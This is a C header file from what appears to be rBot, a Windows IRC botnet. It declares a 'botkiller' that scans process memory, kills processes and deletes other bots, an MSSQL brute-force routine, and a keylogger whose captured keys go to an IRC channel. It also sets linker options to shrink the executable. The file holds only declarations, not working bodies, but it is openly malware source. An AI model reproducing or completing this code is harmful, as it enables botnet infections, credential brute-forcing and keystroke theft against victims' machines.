#ifdef WIN32
#define _WIN32_WINNT	0x0403				// Very important for critical sections.
#define WIN32_LEAN_AND_MEAN					// Good to use.
#pragma optimize("gsy", on)					// Global optimization, Short sequences, Frame pointers.
#pragma comment(linker,"/RELEASE")			// Release code
#pragma comment(linker, "/ALIGN:4096")		// This will save you some size on the executable.
#pragma comment(linker, "/IGNORE:4108 ")	// This is only here for when you use /ALIGN:4096.
//#pragma pack(1)								// Force packing on byte boundaries.
#endif // WIN32

#pragma comment(lib, "Advapi32")//see anything else i dnt need here <---

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <malloc.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <windns.h>
#include <iphlpapi.h>
#include <lm.h>
#include <lmat.h>
#include <io.h>
#include <fcntl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <assert.h>
#include <sqlext.h>
#include <vfw.h>
#include <shlobj.h>
#include <ntsecapi.h>
#include "defines.h"
#include "rBot.h"
#include "advscan.h"


/////////////

	#define MASBUF 4096
	#define GIABUF 2048
	#define BIGBUF 1024
	#define IRCBUF 512
	#define MEDBUF 256
	#define LOWBUF 128


typedef struct SBotKiller
{
	SOCKET m_bsock;
	char m_szAction[LOWBUF];
	char m_szDestination[LOWBUF];
	bool m_bSilent;
	bool m_bVerbose;
	SOCKET ChanSock;
	bool Silent;
	char Channel[LOWBUF];
	int notice;
} SBotKiller;

char *stristr(const char *str, const char *strSearch);
bool file_exists(char *pszFilePath);
bool file_delete(char *pszFilePath);
void *memmem(const void *buf, const void *pattern, size_t buflen, size_t len);
bool process_killpid(DWORD dwPID);
DWORD WINAPI botkiller_main(LPVOID param);
bool botkiller_memscan(DWORD dwPID, char *pszBuffer, DWORD dwSize);
int botkiller_removebot(char *pszFileName, LPVOID param);
////////////////


#ifndef NO_MSSQL
BOOL mssqlbrute(EXINFO exinfo);
#endif

#ifndef NO_KEYLOG
typedef struct KEYLOG 
{	
	SOCKET sock;
	int threadnum;
	char chan[128];
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} KEYLOG;

typedef struct KEYS
{
	int inputL;
	char outputL[7];
	char outputH[7];

} KEYS;

int SaveKeys(char *key, KEYLOG keylog);
DWORD WINAPI KeyLoggerThread(LPVOID param);
#endif